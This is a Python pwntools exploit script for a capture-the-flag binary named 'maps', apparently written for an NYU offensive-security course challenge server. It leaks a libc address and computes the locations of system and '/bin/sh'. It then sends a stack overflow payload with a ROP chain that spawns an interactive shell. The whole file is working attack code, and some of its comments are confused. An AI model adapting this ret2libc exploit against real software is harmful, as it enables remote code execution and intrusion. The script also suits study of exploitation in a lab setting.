from pwn import *

context.log_level = "DEBUG"
context.terminal = ["tmux", "splitw", "-f", "-h"]
context.arch = "amd64"
context.os = "linux"
target_file = "./maps"

LOCAL = True

if LOCAL:
    # p = process(target_file)
    p = gdb.debug(target_file, '''
    b main
    b fgets
    continue
    ''', aslr=False)
    libc = "/lib/x86_64-linux-gnu/libc.so.6"
else:
    p = remote("offsec-chalbroker.osiris.cyber.nyu.edu", 1205)
    libc = "./libc.so.6"

libc_elf = ELF(libc, checksec=False)
target_elf = ELF(target_file, checksec=False)

# Setup the base address information
# Receive the address of stdin
# This will be used as send output below to set the rdi register for the
p.recvuntil(b'free: ')
stdin_address = u64(p.recvline().strip())
print(f'stdin address: {hex(stdin_address)}')

# Compute the base address of libc
stdin_offset = libc_elf.symbols.stdin
base_address = stdin_address - stdin_offset
print(f'Libc base address: {hex(base_address)}')
system_address = libc_elf.symbols.system + base_address
print(f'system address: {hex(system_address)}')

# Find /bin/sh string and system function in libc
bin_sh = next(libc_elf.search(b"/bin/sh")) + base_address
print(f"Found /bin/sh at {hex(bin_sh)}")


# This is sent as the first output to get the address of puts
# puts_got_address = target_elf.got.puts
# print(f'puts_got_address: {hex(puts_got_address)}')

# Handle the first input by sending a packed decimal
p.recvuntil(b'to go?\n')
# p.send(p64(stdin_address))
p.send(p64(0x7ffff7ffe2d0))
address_of_envvars = int(p.recvline().strip(), 16)
print(f'Address of envvars: {hex(address_of_envvars)}')

# Handle the second input by sending a packed decimal
p.recvuntil(b'Could you say it again?\n')
p.send(p64(stdin_address))  # Example packed decimal

# Handle the third input by sending the payload
# This needs to be stdin address to set rdi for fgets
p.recvuntil(b'what are you planning to do?\n')

# Find ROP gadgets
rop = ROP(libc_elf)
rdi_gadget = rop.rdi.address + base_address
ret_gadget = rop.ret.address + base_address

# Create the ROP chain
chain = [
    ret_gadget,
    rdi_gadget,
    bin_sh,
    system_address
]
payload = b'A' * 0x18 + b''.join([p64(c) for c in chain])

p.sendline(payload)

p.interactive()